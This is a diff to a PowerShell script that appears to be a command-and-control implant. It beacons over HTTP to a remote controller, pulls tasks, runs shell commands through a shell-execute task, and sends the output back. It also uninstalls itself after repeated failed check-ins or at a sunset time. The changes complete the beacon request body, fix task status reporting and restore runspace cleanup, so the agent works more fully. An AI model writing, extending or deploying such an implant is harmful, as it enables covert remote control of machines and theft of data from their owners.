@@ -1,13 +1,4 @@
 <#
-    Main loop is:
-    - check in with c2
-    - pull tasks
-    - schedule tasks
-    - mail results
-    - sleep
-#>
-
-<#
     Update Configs
     Get file
     Run command
@@ -17,42 +8,10 @@
 #>
 
 <#
-    c2 server ip:port
-    api endpoints
-    cb frequency
-    cb skew percentage
-    sunset
-#>
-
-<#
     Task Result:
     - Task ID
     - Success/Failure
     - Optional Result Data | Error message
-#>
-
-<#
-    Sunset thread:
-    - Check current time against $SyncedConfig.Sunset.Absolute
-    - If time to bail, notify main thread
-#>
-
-<#
-    Beacon Manager:
-    - Connect to endpoint
-    ? Success - set $SyncedConfig.Beacon.Failures = 0
-    ? Failure - set $SyncedConfig.Beacon.Failures++
-                if $syncedConfig.Beacon.Failures -ge $SyncedConfig.Beacon.MaxTries: uninstall
-    - Pull tasks and add to $SyncedConfig.Tasks.Intake
-#>
-
-<#
-    Task Manager:
-    - monitor for additions to $SyncedConfig.Tasks.Intake
-    - validate tasks are supported
-    - delegate task and move into $SyncedConfig.Tasks.InProgress
-    - if task is to cancel task, iterate over .InProgress and cancel if ID is matched
-
 #>
 
 $SyncedConfig = [hashtable]::Synchronized(@{
@@ -100,14 +59,13 @@ $SyncedConfig = [hashtable]::Synchronized(@{
 $BeaconManager = {
     param($SyncedConfig)
     while ($SyncedConfig.ShouldUninstall -eq $false) {
-        # Beacon
         try {
             if ($SyncedConfig.ID -eq "") {
                 $uri = ("http://{0}:{1}/{2}" -f $SyncedConfig.Beacon.PrimaryController.IPAddress, $SyncedConfig.Beacon.PrimaryController.Port, $SyncedConfig.Beacon.PrimaryController.Route)
                 $body = @{
                     ID = $SyncedConfig.ID
                 }
-                $beaconResponse = Invoke-RestMethod -Method Post -Uri $uri -ContentType "application/json"
+                $beaconResponse = Invoke-RestMethod -Method Post -Uri $uri -ContentType "application/json" -Body ($body | ConvertTo-Json)
             }
             else {
                 $uri = ("http://{0}:{1}/{2}/{3}" -f $SyncedConfig.Beacon.PrimaryController.IPAddress, $SyncedConfig.Beacon.PrimaryController.Port, $SyncedConfig.Beacon.PrimaryController.Route, $SyncedConfig.ID)
@@ -118,6 +76,7 @@ $BeaconManager = {
             $SyncedConfig.Beacon.Failures = 0
 
             # Process beacon configuration response
+            # Might move this into a separate task
             $SyncedConfig.ID = $beaconResponse.ID
             $SyncedConfig.Beacon.PrimaryController.IPAddress = $beaconResponse.Beacon.PrimaryController.IPAddress
             $SyncedConfig.Beacon.PrimaryController.Port = $beaconResponse.Beacon.PrimaryController.Port
@@ -263,8 +222,12 @@ $ShellExecuteTask = {
         $currentTask.Output = "Failed to read output from shell command"
     }
 
-    $currentTask.Status = "Success"
-    $currentTask.Output = $stdout + $stderr
+    if ($currentTask.Status -eq "") {
+        $currentTask.Status = "Success"
+    }
+    if ($currentTask.Output -eq "") {
+        $currentTask.Output = $stdout + $stderr
+    }
 
     $currentTask = @{
         ID       = $currentTask.ID
@@ -327,6 +290,9 @@ $TaskManager = {
                 }
                 default { 
                     # invalid tasktype
+                    $currentTask.Status = "Failed"
+                    $currentTask.Output = "Invalid TaskType"
+                    $SyncedConfig.Tasks.Completed.Add($currentTask)
                     $powershell = $null
                     continue
                 }
@@ -342,7 +308,6 @@ $TaskManager = {
         if ($SyncedConfig.Tasks.InProgress.Count -gt 0) {
             $completed = $SyncedConfig.Tasks.InProgress.Where( { $_.Job.IsCompleted -eq $true })
             foreach ($task in $completed) {
-                # dispatch message
                 $SyncedConfig.Tasks.InProgress.Remove($task)
                 $SyncedConfig.Tasks.Completed.Add($task.Task)
 
@@ -397,12 +362,9 @@ do {
 } until ($SyncedConfig.ShouldUninstall -eq $true)
 
 
-# Change back to this when not editing within VSCode
-# foreach ($runspace in (Get-Runspace).Where( { $_.Id -gt 1 } )) {
-#     [void]$runspace.Close()
-#     [void]$runspace.Dispose()
-# }
-
-
+foreach ($runspace in (Get-Runspace).Where( { $_.Id -gt 1 } )) {
+    [void]$runspace.Close()
+    [void]$runspace.Dispose()
+}
 
 # Probably should clean-up if on disk or something, idk
